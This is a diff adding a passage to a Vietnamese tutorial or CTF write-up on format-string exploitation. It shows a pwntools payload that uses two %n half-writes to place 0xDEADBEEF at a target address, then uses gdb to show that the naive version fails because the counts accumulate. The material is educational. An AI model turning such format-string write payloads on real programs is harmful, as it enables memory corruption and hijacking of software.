@@ -299,3 +299,25 @@ Ta đã có địa chỉ check nhưng có 1 lưu ý nhỏ trước khi nhập pa
 Để đưa được `0xDEADBEEF` vào vùng nhớ thì ta sẽ cần padding tương đương 3GB, một con số khổng lồ:
 
 ![Alt text](image/fs21.png)
+
+Trong khi giới hạn in của `printf` chỉ là ~2^31 => 2GB. Chương trình sẽ Crash ngay lập tức khi ta nhập hết vào.
+
+Giải pháp là ta chỉ nhập vào 2 BYTE dữ liệu mỗi lần (một nửa dữ liệu).
+
+Nhập payload:
+
+	check=0x404090
+	payload=f'%{0xBEEF}c%10$n'.encode()
+	payload+=f'%{0xDEAD}c%11$n'.encode()
+	payload=payload.ljust(32,b'A')
+	payload+=p64(check)
+	payload+=p64(check+2)
+	p.sendafter(b'Your format string: ',payload)
+
+![Alt text](image/fs22.png)
+
+Khi bật gdb kiểm tra lại biến check thì bên trong không phải `0xDEADBEEF`.
+
+![Alt text](image/fs23.png)
+
+Vì `%n` sẽ lấy cả phần padding trước + padding sau rồi cộng lại nên trừ đi phần lặp là cần thiết.
